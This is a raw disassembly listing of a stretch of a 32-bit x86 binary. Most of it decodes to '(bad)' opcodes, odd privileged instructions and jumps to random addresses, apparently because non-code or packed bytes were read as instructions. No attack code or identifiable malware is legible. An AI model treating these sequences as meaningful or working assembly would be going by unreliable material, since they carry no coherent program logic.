  409723:	mov    bh,bh
  409725:	push   DWORD PTR [edx]
  409727:	inc    ecx
  409728:	mov    al,ds:0xbfffca00
  40972d:	cmova  esi,DWORD PTR [edx-0x2]
  409731:	(bad)  
  409732:	jge    0x4096bd
  409734:	mov    ch,0xbc
  409736:	pop    esp
  409737:	mov    edi,edi
  409739:	call   0xa3e9a1
  40973e:	arpl   WORD PTR [edi],cx
  409740:	dec    esi
  409741:	mov    eax,0xe88407a5
  409746:	ret    0x842e
  409749:	jmp    FWORD PTR [edx+0x37fff72a]
  40974f:	jecxz  0x4096e7
  409751:	sbb    DWORD PTR [edi+0x7f454b68],0x6c
  409758:	add    eax,DWORD PTR [eax]
  40975a:	arpl   WORD PTR [edi-0x7],dx
  40975d:	or     edi,DWORD PTR [ebx-0x49]
  409760:	push   esi
  409761:	inc    DWORD PTR [eax]
	...
  40976f:	add    BYTE PTR [eax],al
  409771:	fs jae 0x4097b7
  409774:	je     0x4097ef
  409776:	cmc    
  409777:	enter  0x54fb,0x41
  40977b:	adc    al,0xff
  40977d:	(bad)  
  40977e:	mov    al,0x6c
  409780:	adc    eax,0x5083a731
  409785:	cmp    al,0x19
  409787:	sub    al,0xc6
  40978a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40978b:	cmp    edi,0xffffffdc
  40978e:	sub    BYTE PTR [eax-0x6789d96],al
  409794:	sti    
  409795:	sbb    al,0x79
  409797:	or     ebp,eax
  409799:	dec    edi
  40979a:	test   BYTE PTR [edx+0x7f790cff],0xe8
  4097a1:	scas   al,BYTE PTR es:[edi]
  4097a2:	ss cmp edi,0x2a
  4097a6:	sub    dl,BYTE PTR [eax]
  4097a8:	add    BYTE PTR [esi+0x27816fe3],cl
  4097ae:	fadd   QWORD PTR [ecx+0x351e4ff]
  4097b4:	push   0x60
  4097b6:	aas    
  4097b7:	stc    
  4097b8:	pop    es
  4097b9:	retf   
  4097ba:	mov    edi,0xe4ccff4e
  4097bf:	enter  0x3bfb,0x5
  4097c3:	in     eax,dx
  4097c4:	add    al,0x63
  4097c6:	add    eax,0x7eac896c
  4097cb:	push   ss
  4097cc:	adc    DWORD PTR [ebx],0x6d
  4097cf:	xor    eax,0xf20563a3
  4097d4:	inc    ebx
	...
  4097e1:	add    BYTE PTR [eax],al
  4097e3:	add    BYTE PTR [ecx+ecx*4+0x4a],ch
  4097e7:	add    al,0x63
  4097e9:	add    eax,0x56207b4
  4097ee:	jmp    0xe9dd7405
  4097f3:	add    esp,DWORD PTR [ebx-0x13]
  4097f6:	push   0x33
  4097f8:	and    al,BYTE PTR ds:0x7e748864
  4097fe:	into   
  4097ff:	adc    BYTE PTR [ebx],0x6d
  409802:	mov    dl,BYTE PTR [esp+ebx*2+0x7d]
  409806:	jo     0x409790
  409808:	push   ebx
  409809:	jl     0x4097c1
  40980b:	or     BYTE PTR [ebx+esi*4-0x47],0x81
  409810:	inc    esp
  409811:	jge    0x409824
  409813:	or     BYTE PTR [edx+0x5],ah
  409816:	jmp    0x97b576ab
  40981b:	sub    BYTE PTR [esi+edx*8],0x0
  40981f:	sahf   
  409820:	jnp    0x4097e8
  409822:	call   0x28768e12
  409827:	add    al,0x8b
  409829:	xchg   ebp,eax
  40982a:	mov    ecx,0x63650cc4
  40982f:	mov    ds:0x43f20563,al
  409834:	ja     0x40984c
  409836:	rol    DWORD PTR [ebx],cl
  409838:	out    0x82,al
  40983a:	pop    esi
  40983b:	sub    esp,0x6e82b97c
  409841:	or     eax,0x7cde9d51
  409846:	add    BYTE PTR ds:[eax],0x0
	...
  409856:	add    BYTE PTR [esi],cl
  409858:	jbe    0x40985a
  40985a:	aaa    
  40985b:	loope  0x4098d9
  40985d:	push   0x55fe5
  409862:	je     0x40984f
  409864:	je     0x409864
  409866:	push   ds
  409867:	loope  0x40983e
  409869:	addr16 jae 0x4098e4
  40986c:	(bad)  
  40986d:	inc    DWORD PTR [eax-0x16beca3b]
  409873:	mov    BYTE PTR [eax+esi*1+0x4f6d60a8],cl
  40987a:	push   esi
  40987b:	pusha  
  40987c:	add    eax,0x158c290b
  409881:	push   0xffffffe9
  409883:	in     eax,dx
  409884:	xor    bh,0xdf
  409887:	loop   0x409905
  409889:	push   eax
  40988a:	(bad)  
  40988b:	je     0x409891
  40988d:	call   0xffbc7cc0
  409892:	(bad)  
  409893:	adc    al,0x75
  409895:	(bad)  
  409896:	mov    esi,0xa47d6ce2
  40989b:	loop   0x409918
  40989d:	push   0x2
  40989f:	mov    bh,0x42
  4098a1:	shl    DWORD PTR [esi+0x15c00fe2],1
  4098a7:	sub    ebp,0x70
  4098aa:	fldenv [ecx]
  4098ac:	jl     0x4098fd
  4098ae:	add    DWORD PTR ds:0x3786ff55,0xe218ffee
  4098b8:	icebp  
  4098b9:	pop    es
  4098ba:	add    DWORD PTR [eax],0x0
	...
  4098c8:	add    BYTE PTR [eax],al
  4098ca:	push   ebp
  4098cb:	jp     0x4098cc
  4098cd:	outs   dx,BYTE PTR ds:[esi]
  4098ce:	ja     0x4098a3
  4098d0:	int3   
  4098d1:	data16 loop 0x4098c0
  4098d4:	pop    edi
  4098d5:	sbb    DWORD PTR [eax],esp
  4098d7:	jl     0x409942
  4098d9:	repz jecxz 0x4098cd
  4098dc:	pop    es
  4098dd:	inc    ecx
  4098de:	mov    ch,0x7a
  4098e0:	inc    DWORD PTR [eax]
  4098e2:	and    eax,0xb305f69
  4098e7:	or     BYTE PTR [edx+0x23],ch
  4098ea:	xchg   ebp,eax
  4098eb:	je     0x4098f4
  4098ed:	call   0x402023
  4098f2:	shl    BYTE PTR [edi+0x2f],cl
  4098f5:	inc    ecx
  4098f6:	retf   0x1b69
  4098f9:	dec    edi
  4098fb:	psubsb mm1,QWORD PTR [esp+edx*2+0x1fffff86]
  409903:	cld    
  409904:	(bad)  
  409905:	jne    0x409899
  409907:	out    dx,eax
  409908:	fwait
  409909:	retf   0x8495
  40990c:	leave  
  40990d:	ret    0x77e
  409910:	push   ebp
  409911:	mov    edx,DWORD PTR [esi-0x5a000091]
  409917:	inc    ebp
  409918:	push   DWORD PTR [ebp-0x7a]
  40991b:	test   BYTE PTR [ebp+0x8],dh
  40991e:	mov    ds:0x25ffedf6,al
  409923:	rol    cl,1
  409925:	or     BYTE PTR [edx+0x54],cl
  409928:	mov    ch,ah
  40992a:	mov    ecx,0xc7f7c2
	...
  40993b:	add    BYTE PTR [eax],al
  40993d:	jg     0x4098c4
  40993f:	add    BYTE PTR [eax],al
  409941:	dec    edx
  409942:	pop    es
  409943:	lea    eax,[ebp-0x2a]
  409946:	push   esi
  409947:	stos   BYTE PTR es:[di],al
  409949:	or     cl,BYTE PTR [eax-0x1]
  40994c:	dec    BYTE PTR [edi+0x15]
  40994f:	push   DWORD PTR ds:0x41302d
  409955:	repnz std 
  409957:	into   
  409958:	call   DWORD PTR [ebp+0x1474c009]
  40995e:	nop
  40995f:	inc    ebp
  409960:	clc    
  409961:	adc    cl,BYTE PTR [eax]
  409963:	add    bh,ch
  409965:	aam    0x85
  409967:	jne    0x409965
  409969:	arpl   bx,dx
  40996b:	cmc    
  40996c:	mul    esp
  40996e:	push   ecx
  40996f:	or     ebp,eax
  409971:	cmp    edx,edx
  409973:	jg     0x409974
  409975:	aam    0xb1
  409977:	jnp    0x409961
  409979:	push   cs
  40997a:	and    DWORD PTR [eax+0xb2e9aff],eax
  409980:	add    BYTE PTR [esi],dl
  409982:	imul   DWORD PTR [esi-0x7f]
  409985:	lahf   
  409986:	rol    BYTE PTR [eax-0x79d45301],1
  40998c:	mov    eax,0x800ba5
  409991:	arpl   WORD PTR [ebx+eax*1-0x75],bp
  409995:	push   ds
  409996:	push   0x6917c00c
  40999b:	cmp    DWORD PTR [eax],0x63
  40999e:	icebp  
  40999f:	add    eax,0xe9
	...
  4099b0:	ins    DWORD PTR es:[di],dx
  4099b2:	add    eax,DWORD PTR [eax]
  4099b4:	je     0x409987
  4099b6:	adc    edi,edi
  4099b8:	neg    BYTE PTR [edi+0x6b]
  4099bb:	sub    DWORD PTR [ebx-0x4caf80b5],edx
  4099c1:	inc    ebx
  4099c2:	stc    
  4099c3:	pop    es
  4099c4:	dec    ebx
  4099c5:	ret    0xff7e
  4099c8:	dec    esp
  4099c9:	inc    esp
  4099ca:	sti    
  4099cb:	retf   
  4099cc:	inc    esp
  4099cd:	stos   DWORD PTR es:[edi],eax
  4099ce:	in     al,dx
  4099cf:	mov    BYTE PTR [edi-0x5100fbd3],cl
  4099d5:	push   0x93130d6b
  4099da:	jg     0x409965
  4099dc:	(bad)  
  4099de:	jge    0x4099df
  4099e0:	sbb    al,0x14
  4099e2:	add    DWORD PTR ds:[ebx+0x6c],esp
  4099e6:	nop
  4099e7:	test   DWORD PTR [ecx],esp
  4099e9:	bnd jle 0x4099eb
  4099ec:	mov    bl,0x84
  4099ee:	mov    esp,ecx
  4099f0:	cld    
  4099f1:	add    al,0x66
  4099f3:	xchg   ecx,eax
  4099f4:	fiadd  WORD PTR [esi+0x5f]
  4099f7:	jg     0x4099e5
  4099f9:	aam    0x55
  4099fb:	mov    ecx,0x7f4e7aab
  409a00:	retf   
  409a01:	inc    ebx
  409a02:	fs add al,0x63
  409a05:	mov    WORD PTR [eax+eax*8-0x33],fs
  409a09:	jns    0x409a41
  409a0b:	les    edx,FWORD PTR [ebp-0x7f]
  409a0e:	xchg   BYTE PTR [ebx+eiz*2],al
  409a11:	add    eax,0x9974
	...
  409a22:	add    BYTE PTR [ecx-0x4b80e186],ah
  409a28:	push   es
  409a29:	stc    
  409a2a:	add    esp,DWORD PTR [ebx+0x5]
  409a2d:	xchg   ebp,eax
  409a2e:	imul   edi
  409a30:	(bad)  
  409a31:	sub    edi,DWORD PTR [esi-0x6c]
  409a34:	jns    0x409aa2
  409a36:	ret    0xd538
  409a39:	add    BYTE PTR [edi+0x6be8c437],0xdb
  409a40:	xchg   edi,eax
  409a41:	jmp    0x54860249
  409a46:	add    bh,BYTE PTR [eax-0x22]
  409a49:	arpl   WORD PTR [eax+0x7ece7aa1],bx
  409a4f:	out    dx,al
  409a50:	ret    
  409a51:	adc    al,0xd4
  409a53:	mov    esp,0x4cc50d7f
  409a58:	popa   
  409a59:	aaa    
  409a5a:	mov    eax,ds:0x43e20563
  409a5f:	mov    dh,0x3
  409a61:	xchg   edx,eax
  409a62:	ret    
  409a63:	out    0x92,eax
  409a65:	stos   DWORD PTR es:[edi],eax
  409a66:	jge    0x409a94
  409a68:	jns    0x409ace
  409a6a:	sar    DWORD PTR [eax-0x72],0x64
  409a6e:	mov    bh,0x1d
  409a70:	jns    0x4099f8
  409a72:	jmp    0x409a60
  409a74:	sub    eax,0xf30c0428
  409a79:	jmp    esp
  409a7b:	js     0x409a7b
  409a7d:	into   
  409a7e:	outs   dx,BYTE PTR ds:[esi]
  409a7f:	jge    0x409af9
  409a81:	mov    ch,0x9d
  409a83:	jbe    0x409afd
  409a85:	(bad)  
  409a86:	mov    ecx,0x0
	...
  409a93:	add    BYTE PTR [eax],al
  409a95:	add    BYTE PTR [eax+0x46],bh
  409a98:	iret   
  409a99:	push   esi
  409a9a:	gs js  0x409b12
  409a9d:	stc    
  409a9e:	mov    al,0x60
  409aa0:	mov    eax,0x50785536
  409aa5:	cdq    
  409aa6:	dec    ebp
  409aa7:	repnz pop es
  409aa9:	inc    ecx
  409aaa:	push   DWORD PTR [edi-0x1]
  409aad:	cs dec eax
  409aaf:	scas   eax,DWORD PTR es:[edi]
  409ab0:	retf   
  409ab1:	es xor eax,0x2e2b858a
  409ab7:	js     0x409ab8
  409ab9:	mov    ecx,0xfbcb225
  409abe:	sbb    eax,0xc3d5e878
  409ac3:	add    eax,0x8206400
  409ac8:	test   DWORD PTR [ebp-0x110087fb],ecx
  409ace:	mov    ah,0xb9
  409ad0:	(bad)  
  409ad1:	out    0xf6,al
  409ad3:	ins    BYTE PTR es:[edi],dx
  409ad4:	pop    ds
  409ad5:	jl     0x409b3e
  409ad7:	add    eax,0x77a79cff
  409adc:	dec    esi
  409ade:	iret   
  409adf:	jg     0x409aac
  409ae1:	(bad)  
  409ae2:	(bad)  
  409ae3:	dec    esi
  409ae4:	ret    0x60ed
  409ae7:	ror    BYTE PTR [edx-0x3bf1d3b],cl
  409aed:	scas   al,BYTE PTR es:[edi]
  409aee:	xor    al,0xc
  409af0:	call   0xffb9419f
  409af5:	jo     0x409b1b
  409af7:	jl     0x409b04
  409af9:	test   eax,0x0
	...
  409b06:	add    BYTE PTR [eax],al
  409b08:	add    BYTE PTR [esi-0x7f],dl
  409b0b:	mov    ecx,gs
  409b0d:	pusha  
  409b0e:	add    eax,0x33ea0068
  409b13:	inc    ecx
  409b14:	add    BYTE PTR [ebp-0x6e170490],cl
  409b1a:	(bad)  
  409b1b:	(bad)  
  409b1c:	call   FWORD PTR [edx+0x69]
  409b1f:	xor    BYTE PTR [edx],dh
  409b21:	retf   
  409b22:	add    edx,DWORD PTR [eax-0x1]
  409b25:	pop    ss
  409b26:	or     al,0xe8
  409b28:	xchg   esp,eax
  409b29:	mov    edx,?
  409b2b:	(bad)  
  409b2c:	call   0x3f6833
  409b31:	mov    dl,0xee
  409b33:	xor    BYTE PTR [ecx-0x46],al
  409b36:	clc    
  409b37:	je     0x409b35
  409b39:	and    bl,bl
  409b3b:	int    0xff
  409b3d:	lea    edx,[ecx+0x67]
  409b40:	xor    DWORD PTR [eax+0x4d4fff42],ebx
  409b46:	jo     0x409b4f
  409b48:	call   0x3f9516
  409b4d:	bound  esp,QWORD PTR [edx]
  409b4f:	retf   
  409b50:	call   FWORD PTR [ebp+0x69]
  409b53:	or     eax,0xff03bb32
  409b58:	jne    0x409ae8
  409b5a:	jmp    0x409b14
  409b5c:	into   
  409b5d:	(bad)  
  409b5e:	clc    
  409b5f:	dec    edi
  409b60:	push   0x41335b
  409b65:	sub    bh,dl
  409b67:	je     0x409b71
  409b69:	mov    ds:0xfffd55,al
	...
  409b7a:	add    BYTE PTR [eax],al
  409b7c:	sub    eax,0x1dcb05eb
  409b81:	cli    
  409b82:	sub    BYTE PTR [bx+si+0x44],cl
  409b86:	(bad)  
  409b87:	inc    BYTE PTR [edi-0x2367177b]
  409b8d:	stc    
  409b8e:	(bad)  
  409b8f:	push   eax
  409b90:	push   edx
  409b91:	xor    dh,BYTE PTR [edx]
  409b93:	inc    ecx
  409b94:	cmp    dl,BYTE PTR [ebx-0x2]
  409b97:	jne    0x409bfc
  409b99:	imul   esi,DWORD PTR fs:[ecx],0x1d
  409b9d:	mov    BYTE PTR [eax+ebp*8-0x2],bh
  409ba1:	mov    dl,0x7c
  409ba3:	dec    DWORD PTR [edx+esi*2]
  409ba6:	jg     0x409b90
  409ba8:	mov    es:0xab2aff7c,eax
  409bae:	or     eax,DWORD PTR [eax]
  409bb0:	mov    ?,ebx
  409bb2:	outs   dx,BYTE PTR ds:[esi]
  409bb3:	and    DWORD PTR [edi],0xffffffd9
  409bb6:	shr    DWORD PTR [ecx+0x63],cl
  409bb9:	inc    edx
  409bba:	pop    es
  409bbb:	call   DWORD PTR [esi+0x64]
  409bbe:	imul   edi,esi,0xffffff9c
  409bc1:	mov    edi,0x3826897b
  409bc6:	mov    BYTE PTR ds:0xffc30423,bh
  409bcc:	cmp    al,0x67
  409bce:	add    esi,DWORD PTR [eax+edi*2-0x6c]
  409bd2:	mov    eax,ds:0xd46c2230
  409bd7:	out    0x1a,eax
  409bd9:	icebp  
  409bda:	add    al,BYTE PTR [eax]
  409bdc:	push   0x1df72c
	...
  409bed:	add    BYTE PTR [eax],al
  409bef:	sub    al,0x14
  409bf1:	out    dx,eax
  409bf2:	ror    DWORD PTR [edi+esi*2+0x580fc007],cl
  409bf9:	shl    DWORD PTR [edi+0x32],cl
  409bfc:	mov    edx,0x5f24ffc2
  409c01:	icebp  
  409c02:	pop    es
  409c03:	jnp    0x409bb4
  409c05:	jns    0x409c06
  409c07:	fs inc esp
  409c09:	(bad)
  409c0d:	js     0x409c42
  409c0f:	and    eax,DWORD PTR [ebp-0x48b30085]
  409c15:	jbe    0x409bc5
  409c17:	mov    esp,DWORD PTR [edi-0x10]
  409c1a:	(bad)  
  409c1b:	leave  
  409c1c:	push   edx
  409c1d:	jp     0x409c94
  409c1f:	imul   eax,DWORD PTR ds:0x762d7591,0xffffff9e
  409c26:	out    dx,al
  409c27:	xor    DWORD PTR [esi+0x1c],0x8f5e0b0c
  409c2e:	jnp    0x409c44
  409c30:	jmp    0x409c16
  409c32:	jp     0x409bca
  409c34:	or     eax,0x76055991
  409c39:	jbe    0x409c29
  409c3b:	inc    esi
  409c3c:	jbe    0x409c32
  409c3e:	or     ecx,DWORD PTR [ebx]
  409c40:	push   edx
  409c41:	addr16 jnp 0x409c30
  409c44:	in     al,dx
  409c45:	xchg   esp,eax
  409c46:	xor    al,0xa2
  409c48:	add    eax,0x6d64f156
  409c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c4e:	js     0x409c24
  409c50:	jne    0x409c23
  409c52:	add    BYTE PTR gs:[eax],al
	...
  409c61:	add    BYTE PTR [ebx+0x4e7ae8c4],dl
  409c67:	or     eax,0x75be3c41
  409c6c:	cs in  al,dx
  409c6e:	dec    esp
  409c6f:	xor    al,0xa8
  409c71:	add    ebp,DWORD PTR [edi+ebp*8+0x78786bf0]
  409c78:	push   ss
  409c79:	jnp    0x409c86
  409c7b:	mov    edi,0x7694c4d7
  409c80:	jl     0x409c8d
  409c82:	jnp    0x409c9a
  409c84:	cld    
  409c85:	jp     0x409c0b
  409c87:	in     al,dx
  409c88:	je     0x409cbe
  409c8a:	and    al,BYTE PTR ds:0x6d5cf0ee
  409c90:	clc    
  409c91:	js     0x409cff
  409c93:	jne    0x409ce6
  409c95:	scas   al,BYTE PTR es:[edi]
  409c96:	xor    al,ah
  409c98:	call   0xc13e7317
  409c9d:	call   DWORD PTR [edi+0x75]
  409ca0:	(bad)  
  409ca1:	jp     0x409c79
  409ca3:	jno    0x409c63
  409ca5:	lock pop esp
  409ca7:	pop    ebp
  409ca8:	add    BYTE PTR [ebx],dh
  409caa:	mov    al,ds:0xa60eff74
  409caf:	inc    edi
  409cb0:	add    al,0xe9
  409cb2:	adc    eax,DWORD PTR [eax+0x12b6aec]
  409cb8:	add    BYTE PTR ds:0xf9757471,bl
  409cbe:	cdq    
  409cbf:	cli    
  409cc0:	or     eax,DWORD PTR [esi-0x4c17f2ed]
	...
  409cd2:	add    BYTE PTR [eax],al
  409cd4:	add    BYTE PTR [ebp+0x74],dh
  409cd7:	push   DWORD PTR [esi-0xd]
  409cda:	add    al,ch
  409cdc:	xchg   ecx,eax
  409cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cde:	je     0x409cdf
  409ce0:	xor    BYTE PTR [esi-0x2a4bffff],ah
  409ce6:	popa   
  409ce7:	sub    DWORD PTR ds:0x4dffdf54,0xffffffd3
  409cee:	sbb    bh,bh
  409cf0:	mov    esp,0xed757470
  409cf5:	cmp    BYTE PTR [ebx-0x34],bl
  409cf8:	cmp    DWORD PTR ss:[eax],eax
  409cfb:	shl    BYTE PTR [ebp+0x25457d8c],0xb8
  409d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d03:	xor    ch,BYTE PTR [eax+0x15757460]
  409d09:	or     BYTE PTR [esi-0x22e6f134],bh
  409d0f:	(bad)  
  409d10:	call   0xfe91500e
  409d15:	je     0x409d23
  409d17:	call   0xffb49668
  409d1c:	or     ebx,0xebe94137
  409d22:	stc    
  409d23:	sti    
  409d24:	sar    DWORD PTR [ecx],1
  409d26:	inc    edx
  409d27:	call   esi
  409d29:	dec    edi
  409d2a:	add    eax,0xd519be00
  409d2f:	inc    BYTE PTR [eax]
  409d31:	pop    DWORD PTR [ecx]
  409d33:	call   0xff2ea2c2
  409d38:	push   0x0
	...
  409d45:	add    BYTE PTR [eax],al
  409d47:	add    BYTE PTR [edx+0x500413b],dh
  409d4d:	fs sti 
  409d4f:	call   0x3f687d
  409d54:	push   edx
  409d55:	or     eax,DWORD PTR [eax]
  409d57:	out    dx,eax
  409d58:	mov    ah,0x59
  409d5a:	(bad)  
  409d5b:	jne    0x409d5f
  409d5d:	loopne 0x409dcd
  409d5f:	jmp    ebp
  409d61:	in     eax,dx
  409d62:	(bad)  
  409d63:	jne    0x409ceb
  409d65:	loope  0x409dc4
  409d67:	leave  
  409d68:	jne    0x409d58
  409d6a:	enter  0x1ac2,0x8
  409d6e:	push   ebp
  409d6f:	mov    edx,DWORD PTR [esi-0x44cd3b9f]
  409d75:	pop    es
  409d76:	push   DWORD PTR [ebp-0x3a]
  409d79:	fucomip st,st(0)
  409d7b:	int3   
  409d7c:	and    eax,0xaa75feee
  409d81:	push   edi
  409d82:	out    0x34,eax
  409d84:	ja     0x409d74
  409d86:	(bad)  
  409d87:	(bad)  
  409d88:	inc    DWORD PTR [ebx]
  409d8a:	push   eax
  409d8b:	(bad)  
  409d8c:	out    dx,eax
  409d8d:	jmp    edi
  409d8f:	ds test esi,ebp
  409d92:	(bad)  
  409d93:	push   0x413b6b
  409d98:	jne    0x409dfe
  409d9a:	or     ebp,eax
  409d9c:	cmp    eax,0x65fffebd
  409da1:	fs (bad) 
  409da4:	jb     0x409dc1
  409da6:	int    0xff
  409da8:	jne    0x409d96
  409daa:	je     0x409dc0
	...
  409db8:	add    BYTE PTR [eax],al
  409dba:	add    dl,bl
  409dbc:	in     al,dx
  409dbd:	je     0x409dc7
  409dbf:	xchg   edx,eax
  409dc0:	sbb    edi,edi
  409dc2:	inc    DWORD PTR [ebp+0x6310c1be]
  409dc8:	pop    esp
  409dc9:	into   
  409dca:	mov    al,BYTE PTR [edi-0x20]
  409dcd:	ds cld 
  409dcf:	dec    esp
  409dd0:	xor    cl,BYTE PTR [eax]
  409dd2:	call   0xffb93f8a
  409dd7:	push   0xea49ef9c
  409ddc:	sub    DWORD PTR [eax+0x68],edi
  409ddf:	arpl   WORD PTR [eax+ebp*2-0x42],bx
  409de3:	mov    ebx,0x634134be
  409de8:	fwait
  409de9:	out    dx,al
  409dea:	sti    
  409deb:	adc    al,0x1a
  409ded:	or     al,0xe8
  409def:	fmul   DWORD PTR [ebx+0x5d7bff78]
  409df5:	add    ebp,edi
  409df7:	mov    ebp,0xa232a704
  409dfc:	pop    esp
  409dfd:	js     0x409e74
  409dff:	out    dx,eax
  409e00:	jmp    0x409def
  409e02:	pop    es
  409e03:	sti    
  409e04:	pop    edx
  409e05:	js     0x409e06
  409e07:	fadd   QWORD PTR [ebp+eax*1+0x0]
  409e0b:	les    eax,FWORD PTR [edx-0x626e4815]
  409e11:	add    edi,edi
  409e13:	dec    esi
  409e14:	xor    BYTE PTR [eax+0x75],bh
  409e17:	imul   eax,esp,0xffffffe1
  409e1a:	(bad)  
  409e1b:	mov    ah,0x23
  409e1d:	js     0x409e94
	...
  409e2b:	add    BYTE PTR [eax],al
  409e2d:	add    BYTE PTR [edi-0x5b374bec],ch
  409e33:	adc    ecx,DWORD PTR [edx-0x3e]
  409e36:	imul   ebx,DWORD PTR [esi+ecx*8-0x76],0xffffff87
  409e3b:	fistp  QWORD PTR [esi]
  409e3d:	cld    
  409e3e:	stc    
  409e3f:	pop    ebx
  409e40:	in     eax,dx
  409e41:	add    al,0x84
  409e43:	stc    
  409e44:	or     ch,al
  409e46:	xchg   esi,eax
  409e47:	and    DWORD PTR [eax-0x1],edi
  409e4a:	jmp    0x1b04:0xf06877a9
  409e51:	lds    esp,FWORD PTR [edx+ebp*8+0x1f]
  409e55:	xor    ah,BYTE PTR [edx+0x7c31d605]
  409e5b:	sbb    al,0x28
  409e5d:	add    al,0x4c
  409e5f:	clc    
  409e60:	lock imul esi,ebp,0x72
  409e64:	mov    esi,0xfb88cb77
  409e69:	les    esi,FWORD PTR [edx+ebp*8]
  409e6c:	sbb    esi,DWORD PTR [edx]
  409e6e:	mov    ds:0x7c31a605,al
  409e73:	sbb    al,0x28
  409e75:	add    al,0x1c
  409e77:	clc    
  409e78:	loopne 0x409ee5
  409e7a:	in     eax,dx
  409e7b:	jb     0x409e0b
  409e7d:	ja     0x409efa
  409e7f:	jg     0x409e3c
  409e81:	les    eax,FWORD PTR [edx+ebp*8]
  409e84:	mov    edi,0x7605a231
  409e89:	xor    DWORD PTR [esp+ebx*1],edi
  409e8c:	sub    BYTE PTR [esp+ebp*8],al
  409e8f:	div    eax
  409e91:	imul   eax,DWORD PTR [eax],0x0
	...
  409ea0:	add    BYTE PTR [ebp+0x73],ah
  409ea3:	pop    esi
  409ea4:	ja     0x409ef1
  409ea6:	call   0x320f:0xe9d4c51b
  409ead:	and    al,BYTE PTR ds:0x1c7c3146
  409eb3:	test   al,0x3
  409eb5:	mov    esp,0x3d6be0f7
  409eba:	jae    0x409eea
  409ebc:	ja     0x409ef9
  409ebe:	neg    dl
  409ec0:	les    esp,FWORD PTR [ecx+ebp*8+0x52231bd]
  409ec7:	push   ss
  409ec8:	xor    DWORD PTR [esp+ebx*1],edi
  409ecb:	test   al,0x3
  409ecd:	mov    edi,?
  409ecf:	lock imul edx,DWORD PTR ds:0xb76fe73,0xffffff88
  409ed7:	add    BYTE PTR [ebx-0x71988e61],bh
  409edd:	xor    al,ah
  409edf:	jmp    ebp
  409ee1:	xor    ebp,DWORD PTR [edx]
  409ee3:	sub    DWORD PTR [eax],ebp
  409ee5:	addr16 jo 0x409f5d
  409ee8:	loope  0x409eb2
  409eea:	aaa    
  409eeb:	dec    dh
  409eed:	aad    0xdd
  409eef:	mov    ebx,edi
  409ef1:	pop    ds
  409ef2:	jno    0x409f5b
  409ef4:	push   ds
  409ef5:	jno    0x409ebd
  409ef7:	push   DWORD PTR [ebp+0x28292873]
  409efd:	addr16 jo 0x409f75
  409f00:	icebp  
  409f01:	mov    eax,0x9efe0f
	...
  409f12:	add    BYTE PTR [eax],al
  409f14:	xchg   ebp,eax
  409f15:	fst    QWORD PTR [esi+0x67711fdb]
  409f1b:	cs push ecx
  409f1d:	(bad)  
  409f1e:	inc    DWORD PTR [ebp+0x28292853]
  409f24:	addr16 jo 0x409f9c
  409f27:	loope  0x409eb1
  409f29:	pop    es
  409f2a:	(bad)  
  409f2b:	outs   dx,BYTE PTR ds:[esi]
  409f2c:	jne    0x409f0b
  409f2e:	jb     0x409f4b
  409f30:	push   ds
  409f31:	jno    0x409f9a
  409f33:	and    BYTE PTR [ecx+0x62c0ffc6],dl
  409f39:	add    eax,0xfa556900
  409f3e:	pop    es
  409f3f:	push   ecx
  409f40:	cmp    eax,0xc83eff72
  409f45:	mov    DWORD PTR [edx],esi
  409f47:	test   al,0x60
  409f49:	fisttp QWORD PTR [ebx+edi*8-0x59]
  409f4d:	jo     0x409fb6
  409f4f:	jmp    0x409fb1
  409f51:	add    eax,0x8931e80
  409f56:	call   0xffb0ba8c
  409f5b:	sbb    edx,0x7a004133
  409f61:	pop    esp
  409f62:	cmp    BYTE PTR [edx],dh
  409f64:	retf   
  409f65:	add    al,0x68
  409f67:	add    cl,BYTE PTR [edx-0x8007ffc]
  409f6d:	sti    
  409f6e:	out    0xc1,eax
  409f70:	jg     0x409f6c
  409f72:	(bad)  
  409f73:	push   0x4133d5
	...
  409f84:	add    BYTE PTR [eax],al
  409f86:	add    BYTE PTR [edx+0x3a41322c],ah
  409f8c:	pop    esp
  409f8d:	add    DWORD PTR [eax],eax
  409f8f:	cmp    al,BYTE PTR [edi+edi*8-0x5623cd8b]
  409f96:	std    
  409f97:	in     eax,dx
  409f98:	stc    
  409f99:	addr16 jae 0x409fc4
  409f9c:	inc    ebx
  409f9d:	jmp    DWORD PTR [edi-0x63]
  409fa0:	xor    eax,DWORD PTR [ecx+0x0]
  409fa3:	jb     0x409fa8
  409fa5:	add    BYTE PTR [eax],al
  409fa7:	mov    bh,dl
  409fa9:	je     0x409fb3
  409fab:	loop   0x409f42
  409fad:	std    
  409fae:	(bad)  
  409faf:	frstor [eax-0x7c]
  409fb2:	xor    cl,BYTE PTR [ebx+0x9]
  409fb5:	push   0xff42b85f
  409fba:	addr16 clc 
  409fbc:	add    eax,DWORD PTR [eax]
  409fbe:	cmp    BYTE PTR [ebp+0x60],0x7
  409fc2:	call   0x3f9685
  409fc7:	mov    ds:0xba41327d,al
  409fcc:	pop    ebx
  409fcd:	pop    esi
  409fce:	xor    bh,bl
  409fd0:	add    ebp,DWORD PTR [eax+0x2]
  409fd3:	retf   0x8003
  409fd6:	push   edi
  409fd8:	sti    
  409fd9:	out    0x65,eax
  409fdb:	jg     0x409fd7
  409fdd:	(bad)  
  409fde:	push   0x413325
  409fe3:	repnz pop eax
  409fe5:	xor    DWORD PTR [ecx+0x63],eax
  409fe8:	pop    esi
  409fe9:	jmp    0x409fec
	...
  409ff7:	add    BYTE PTR [eax],al
  409ff9:	add    BYTE PTR [ebx+0x5e],ah
  409ffc:	cmp    edi,0xe
  409fff:	jbe    0x40a06c
  40a001:	dec    esi
  40a002:	jle    0x40a072
  40a004:	je     0x40a070
  40a006:	pop    ecx
  40a007:	ja     0x409ff7
  40a009:	pop    es
  40a00a:	jnp    0x40a070
  40a00c:	jne    0x40a00d
  40a00e:	shl    DWORD PTR fs:[eax],cl
  40a011:	call   esi
  40a013:	je     0x40a080
  40a015:	call   DWORD PTR [esi+0x58]
  40a018:	je     0x40a084
  40a01a:	outs   dx,DWORD PTR ds:[esi]
  40a01b:	aas    
  40a01c:	out    dx,al
  40a01d:	pop    es
  40a01e:	cmp    esi,DWORD PTR [edx-0x4fc3008a]
  40a024:	out    dx,al
  40a025:	sti    
  40a026:	xor    al,0x32
  40a028:	or     al,0xe8
  40a02a:	mov    ah,0xa8
  40a02c:	je     0x40a02d
